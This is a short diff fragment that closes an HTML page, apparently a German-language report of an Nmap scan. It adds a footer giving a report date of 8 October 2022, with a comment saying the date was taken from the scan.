+        <p>Berichtsdatum: 8. Oktober 2022</p> <!-- Datum aus Nmap-Scan extrahiert -->
+    </footer>
+</body>
+</html>
